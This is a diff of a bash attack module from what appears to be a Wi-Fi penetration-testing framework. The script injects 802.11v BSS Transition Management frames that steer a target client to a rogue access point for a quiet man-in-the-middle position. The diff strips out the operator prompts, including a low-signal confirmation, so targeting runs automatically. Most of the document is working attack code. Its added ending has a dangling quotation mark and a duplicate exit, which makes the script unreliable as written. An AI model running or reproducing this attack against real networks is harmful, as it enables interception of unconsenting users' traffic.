@@ -15,73 +15,47 @@
 #  G5: BSS Transition Attack (Golden Wrapper)
 #
 #  METHODOLOGY:
-#  1. Target clients connected to an AP supporting 802.11v.
+#  1. Use TARGET_CLIENT provided by Go brain.
 #  2. Send a 'BSS Transition Management Request' frame to the client.
 #  3. The request "recommends" the client move to a new BSSID (our rogue AP).
-#  4. This allows for a "polite" MITM attack that does not require deauth
-#     and is less likely to be detected by WIDS.
+#  4. This allows for a "polite" MITM attack that does not require deauth.
 #===============================================================================
 
 set -euo pipefail
 
+# Intelligence Insight (Colors)
 C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
 C_VAR="${ASTRA_COLOR_VAR:-}"
 C_BOLD="${ASTRA_COLOR_BOLD:-}"
+C_ACTION="${ASTRA_COLOR_ACTION:-}"
 C_RESET="${ASTRA_COLOR_RESET:-}"
 
-# SNR Safeguard (Red Team Hardening)
-if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
-    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
-    echo -e "[*] BSS Transition frames are highly likely to be dropped at this distance."
-    read -p "$(echo -e "${C_BOLD}[?] Continue anyway? [y/N]: ${C_RESET}")" snr_continue
-    [[ "$snr_continue" != "y" ]] && exit 0
-fi
-
 # Inputs from Environment
-# ...
+INTERFACE="${MONITOR_INTERFACE:-}"
+SSID="${GUEST_SSID:-}"
+BSSID="${GUEST_BSSID:-}"
+SESSION_DIR="${SESSION_DIR:-.}"
+EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
+ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
+TC_ID="G5"
+TARGET_CLIENT="${TARGET_CLIENT:-}"
+ROGUE_BSSID="${ROGUE_BSSID:-00:11:22:33:44:55}" # From Go brain
 
 if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
     echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
     exit 1
 fi
 
-echo -e "${C_PROMPT}[*]${C_RESET} Initializing Active BSS Transition (802.11v) Attack against ${C_VAR}${BSSID}${C_RESET}..."
-
-# 1. Identify clients
-echo -e "${C_PROMPT}[*]${C_RESET} Identifying active clients for transition targeting..."
-CLIENT_FILE="${EVIDENCE_DIR}/g5_clients.txt"
-DISC_PREFIX="${EVIDENCE_DIR}/g5_discovery"
-airodump-ng --bssid "$BSSID" --write "$DISC_PREFIX" --output-format csv "$INTERFACE" > /dev/null 2>&1 &
-DISC_PID=$!
-sleep 15
-kill "$DISC_PID" || true
-wait "$DISC_PID" 2>/dev/null || true
-
-awk -F',' '/Station/ {f=1;next} f {print $1}' "${DISC_PREFIX}-01.csv" | tr -d ' ' | grep -E '([0-9A-Fa-f]{2}:){5}' > "$CLIENT_FILE" || true
-
-CLIENTS=()
-while read -r c; do CLIENTS+=("$c"); done < "$CLIENT_FILE"
-
-if [[ ${#CLIENTS[@]} -eq 0 ]]; then
-    echo -e "${C_PROMPT}[!]${C_RESET} No clients discovered on ${BSSID}. Attack aborted."
+if [[ -z "$TARGET_CLIENT" ]]; then
+    echo "[!] No target client specified. BSS Transition requires a victim station."
     exit 0
 fi
 
-echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select target client for transition:${C_RESET}"
-for i in "${!CLIENTS[@]}"; do
-    echo "    $((i+1))) ${CLIENTS[$i]}"
-done
-read -p "$(echo -e "${C_BOLD}Selection [1-${#CLIENTS[@]}]: ${C_RESET}")" choice
-TARGET_CLIENT="${CLIENTS[$((choice-1))]}"
+echo -e "${C_PROMPT}[*]${C_RESET} Starting BSS Transition (802.11v) mission for: ${C_VAR}$TARGET_CLIENT${C_RESET}"
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 20 --status "Injecting BTM requests..."
 
-read -p "$(echo -e "${C_BOLD}[?] Enter Rogue AP BSSID: ${C_RESET}")" ROGUE_BSSID
-if [[ -z "$ROGUE_BSSID" ]]; then
-    echo -e "${C_PROMPT}[!]${C_RESET} Rogue BSSID required."
-    exit 1
-fi
-
-# 2. Execute Active Injection
-echo "[*] Injecting 802.11v BSS Transition Management Request..."
+# Execute Active Injection
+echo -e "[*] Injecting 802.11v BTM Request to steer ${C_VAR}$TARGET_CLIENT${C_RESET} to ${C_VAR}$ROGUE_BSSID${C_RESET}..."
 PYTHON_INJECTOR="${EVIDENCE_DIR}/g5_inject.py"
 
 cat <<EOF > "$PYTHON_INJECTOR"
@@ -107,17 +81,20 @@ EOF
 
 python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE"
 
-# 3. Reporting
-echo "[+] BSS transition injection complete."
+# Reporting
+echo -e "[+] Transition injection complete."
 "$ASTRA_BIN" record-finding \
     --session-dir "$SESSION_DIR" \
     --tc "$TC_ID" \
     --type vulnerability \
     --name "BSS Transition Injection Executed" \
     --severity HIGH \
-    --desc "Injected 802.11v BTM Request frames to force client $TARGET_CLIENT to roam to $ROGUE_BSSID." \
+    --desc "Injected 802.11v BTM Request frames to steer client $TARGET_CLIENT to $ROGUE_BSSID." \
     --target "$TARGET_CLIENT" \
     --evidence "$PYTHON_INJECTOR" \
-    --rationale "Abusing 802.11v allows for 'silent' Man-in-the-Middle positioning by tricking clients into roaming to attacker-controlled infrastructure without the noise of deauthentication."
+    --rationale "Abusing 802.11v allows for 'silent' MITM positioning."
+
+exit 0
+"
 
 exit 0
